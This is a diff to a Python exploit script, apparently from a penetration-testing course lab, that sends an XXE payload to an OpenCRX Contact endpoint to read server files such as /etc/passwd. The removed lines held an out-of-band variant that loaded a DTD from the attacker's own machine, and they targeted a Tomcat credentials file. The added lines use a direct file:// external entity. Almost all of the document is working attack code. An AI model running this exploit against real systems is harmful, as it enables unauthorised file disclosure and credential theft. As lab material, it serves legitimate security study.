@@ -179,26 +179,19 @@ def login(ip, username, password):
 
 # 9.3.6.3: Create script to parse results of XXE and clearly display fiel contents
 def read_file(ip, session, username, password, filename):
-	LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
-	
 	print()
 	print(f"Reading file contents of file {filename}")
-	print("Remember to make sure web-server is running")
 
 	brkpoint = "hhhhhbreakpoint" # Unique word to sandwich output
 	xml = ("<?xml version=\"1.0\"?>"
-	"<!DOCTYPE data["
-	"<!ENTITY % start \"<![CDATA[\">"
-	f"<!ENTITY % file SYSTEM \"file://{filename}\" >"
-	"<!ENTITY % end \"]]>\">"
-	f"<!ENTITY % dtd SYSTEM \"http://{LHOST}/wrapper.dtd\" >"
-	"%dtd;"
+	"<!DOCTYPE data ["
+	"<!ELEMENT data ANY >"
+	f"<!ENTITY lastname SYSTEM \"file://{filename}\">"
 	"]>"
 	"<org.opencrx.kernel.account1.Contact>"
-	f"<lastName>{brkpoint}&wrapper;{brkpoint}</lastName>"
+	f"<lastName>{brkpoint}&lastname;{brkpoint}</lastName>"
 	"<firstName>Tom</firstName>"
 	"</org.opencrx.kernel.account1.Contact>")
-	print(xml)
 
 	auth_header = f"Basic {b64encode(username + ':' + password)}"
 	headers = {
@@ -239,7 +232,7 @@ def main():
 	print("Logging in")
 	session = login(ip, username, password)
 
-	read_file(ip, session, username, password, "/home/student/crx/apache-tomee-plus-7.0.5/conf/tomcat-users.xml")
+	read_file(ip, session, username, password, "/etc/passwd")
 
 if __name__ == '__main__':
 	main()
